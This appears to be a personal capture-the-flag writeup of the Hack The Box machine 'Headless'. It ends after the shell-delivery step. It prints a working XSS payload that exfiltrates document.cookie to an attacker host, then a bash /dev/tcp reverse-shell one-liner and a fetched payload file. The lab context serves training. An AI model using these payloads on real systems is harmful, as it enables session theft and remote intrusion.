---
layout: default
title : brenda - headless HTB Writeup
---


![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(118).png)

`Headless` is an easy machine in HTB.

### Recon
### Nmap scan
`Nmap` detects two open ports on headless: ssh (80) and http UPnP(5000). Port 5000  seems to return a web page under construction.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(121).png)

Then added headless to /etc/host and proceeded to navigate to the website `http://headless.htb:5000`

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(122).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(150).png)

### Directory Search

I used `ffuf` to search directories in headless.htb.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(123).png)

I got two directories: /dashboard which was restricted and /support. I navigated to /support directory

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(124).png)

The `/support` URI allows payload injection, triggering a hacking protection alert. The application replies with user HTTP request header info, indicating a potential reflected-XSS vulnerability.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(125).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(126).png)

### User flag

### Cookie stealing
I looked for how to steal cookies and found this [article](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e). First, I initiated a Python server on port 1234 using the command:

`python3 -m http.server 1234`

Then, I captured an HTTP request and sent it to Repeater. 
Within Repeater, I injected a cookie-stealing payload into reflected headers like "User-Agent", "Accept" and "message" until I got a response. 

`<script>var i=new Image(); i.src="http://10.10.14.21:1234/?cookie="+btoa(document.cookie);</script>`

I repeated this process until the server intercepted and processed the injected payload.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(130).png)

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(131).png)

After setting the accept field to the payload, my server intercepted the cookie, which was encoded in base64. I then proceeded to decode the cookie to reveal its contents.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(140).png)

Now that I obtained the desired cookie, I returned to `/dashboard` and intercepted the request in Burp Suite. I replaced the original cookie with the one we discovered.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(134).png)

I forwarded the request and got this page.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(133).png)

I attempted to gain access to a shell while being behind a protected page. To do so, I created a payload file named `shell.sh` containing the following code:

`/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.21/1333 0>&1'`

Then set up a listener on port 1333

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(141).png)

With the server still running on port 1234, I requested the payload file `shell.sh` from my machine to the target server.

![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(138).png)















